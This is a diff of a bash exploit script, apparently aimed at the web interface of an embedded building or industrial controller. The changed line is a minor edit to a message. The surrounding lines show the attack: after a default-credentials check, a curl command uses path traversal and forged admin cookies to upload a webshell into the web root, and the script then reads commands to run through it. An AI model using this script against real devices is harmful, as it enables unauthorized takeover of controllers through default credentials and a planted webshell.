@@ -24,7 +24,7 @@ echo "------------------------"
 rm resp
 
 else
-echo  "Default Creds OK, let's upload payload a webshell"
+echo  "Default Creds OK, let's upload a webshell"
 curl -sk -F "path=C:/ce/eec/data/uploads" -F "filename=@z.lp; filename=../../htdocs/z.lp"  -H "Cookie: xwsID=hey;lastLogin=admin; tabSet_serviceReset=0; tabSet_serviceDatabase=0; tabSet_serviceReboot=0; tabSet_serviceFirmware=0; tabSet_cfgGeneral=0; tabSet_cfgTcpip=0; tabSet_cfgLon=0; tabSet_cfgMb=0; tabSet_cfgTime=0; tabSet_cfgPortal=0; tabSet_undefined=0; tabSet_editAlarm_2=0; tabSet_getNewNode=0; tabSet_getMaintainance=0; tabSetNodelist=4; tabSet_dataExp5=0; tabSet_dataView5=0" "$1/request.lp?url=static%2Frequests%2Fupload&cmd=&source=doc"
 echo -n "$~> "
 read cmds
